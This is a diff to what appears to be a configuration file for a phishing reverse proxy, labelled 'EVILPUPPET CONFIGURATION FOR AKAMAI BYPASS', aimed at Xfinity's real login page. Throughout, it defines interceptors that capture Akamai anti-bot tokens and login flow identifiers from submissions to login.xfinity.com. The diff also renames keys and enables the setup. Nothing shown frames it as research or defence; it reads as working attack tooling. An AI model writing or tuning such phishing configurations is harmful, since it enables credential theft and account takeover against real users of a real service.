@@ -70,7 +70,8 @@ credentials:
 # EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
 # ============================================
 
-evilpuppet:
+puppet:
+  enabled: true
   triggers:
     # Trigger 1: When user submits email (first step)
     - id: 'xfinity_email'
@@ -132,42 +133,42 @@ evilpuppet:
   interceptors:
     # Interceptor for email submission tokens
     - token: 'X-hzfdeCEGvt-a'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-a=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-a'
       abort: true
     - token: 'X-hzfdeCEGvt-z'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-z=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-z'
       abort: true
     - token: 'X-hzfdeCEGvt-d'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-d=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-d'
       abort: true
     - token: 'X-hzfdeCEGvt-c'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-c=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-c'
       abort: true
     - token: 'X-hzfdeCEGvt-b'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-b=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-b'
       abort: true
     - token: 'X-hzfdeCEGvt-f'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'X-hzfdeCEGvt-f=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'X-hzfdeCEGvt-f'
       abort: true
     
     # Also intercept the flow parameters
     - token: 'flowId'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'flowId=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'flowId'
       abort: false
     - token: 'flowStateId'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'flowStateId=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'flowStateId'
       abort: false
     - token: 'flowStep'
-      url_re: '^https://login\.xfinity\.com/login.*'
-      post_re: 'flowStep=([^&]*)'
+      url_pattern: '^https://login\.xfinity\.com/login.*'
+      parameter: 'flowStep'
       abort: false
 
 # ============================================
